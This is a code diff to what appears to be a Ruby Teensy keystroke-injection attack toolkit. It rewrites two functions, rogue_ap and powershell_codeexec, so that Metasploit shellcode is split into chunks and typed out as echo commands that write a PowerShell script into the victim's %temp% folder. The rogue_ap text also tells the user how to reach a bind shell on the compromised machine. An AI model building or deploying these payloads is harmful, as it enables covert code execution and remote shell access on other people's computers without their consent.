@@ -232,26 +232,24 @@ def rogue_ap()
   puts"Currently, to use this you need to copy msf shellcode to rogue_ap.txt in src directory."
   puts"The shellcode needs to be generated using the command in payloadgen.txt in extras directory."
   puts"To connect to the bind shell. Set LPORT as what you specify here."
-  puts"RHOST must should be set to the IP of Default Gateway, AFTER connecting to the SSID."
+  puts"RHOST must be set to the IP of Default Gateway, AFTER connecting to the SSID."
   file = File.read("./lib/src/rogue_ap.pde")
   file_p = File.read("./lib/src/rogue_ap.txt")
-
-  j=150
-  i=4
-  match = file_p[0,150]
-
-  input=file.gsub(/INPUT3/,match)
-
-  while i<=12  do
-    match = file_p[j,150]
-        input = input.gsub(/INPUT#{i}/,match)
-    i+=1
-
-    j+=150
+  shellcode = file_p.scan(/.{1,150}/)
+  key_init = "Keyboard.println(\"echo "
+  key_end = " >> %temp%\\\\\\ce.ps1\");\n"
+  input = ""
+  File.foreach("./lib/src/rogue_ap.pde") do |line|
+    if (line =~ /SHELLCODE/)
+      shellcode.each do |codeline|
+        input = input + key_init
+        input = input + codeline
+        input = input + key_end
+      end
+    end
   end
-
+  input = file.gsub(/SHELLCODE/,input)
   File.open("./lib/src/rogue_ap.tmp","w") {|f| f.puts input}
-  
   ssid = input("Enter the SSID for the hosted network to be added: ")
   key = input_pass("Enter the key (min 8 chracters) for the network: ")
   port = input("Enter the port on which bind shell will listen: ")
@@ -286,26 +284,22 @@ def powershell_codeexec()
   puts"The payload needs to be generated using the command in payloadgen.txt in extras directory."
   file = File.read("./lib/src/powershell_codeexec.pde")
   file_p = File.read("./lib/src/powershell_codeexec.txt")
-
-  j=150
-  i=1
-  match = file_p[0,150]
-
-  input=file.gsub(/INPUT0/,match)
-
-  while i<=9  do
-    match = file_p[j,150]
-        input = input.gsub(/INPUT#{i}/,match)
-    i+=1
-
-    j+=150
-
+  shellcode = file_p.scan(/.{1,150}/)
+  key_init = "Keyboard.println(\"echo "
+  key_end = " >> %temp%\\\\\\ce.ps1\");\n"
+  input = ""
+  File.foreach("./lib/src/powershell_codeexec.pde") do |line|
+    if (line =~ /SHELLCODE/)
+      shellcode.each do |codeline|
+        input = input + key_init
+        input = input + codeline
+        input = input + key_end
+      end
+    end
   end
-
-  File.open("#$output_path/output/powershell_codeexec.pde","w") {|f| f.puts input}
-  puts"\nNow copy the generated #$output_path/output/powershell_codeexec.pde to your Teensy device.".cyan.bold
-  puts"\nPress return to return to Main Menu.".yellow.bold
-  gets
+  input = file.gsub(/SHELLCODE/,input)
+  File.open("./lib/src/powershell_codeexec.tmp","w") {|f| f.puts input}
+  search_replace("./lib/src/powershell_codeexec.tmp","#$output_path/output/powershell_codeexec.pde","")
 end
 
 def time_based_exec()
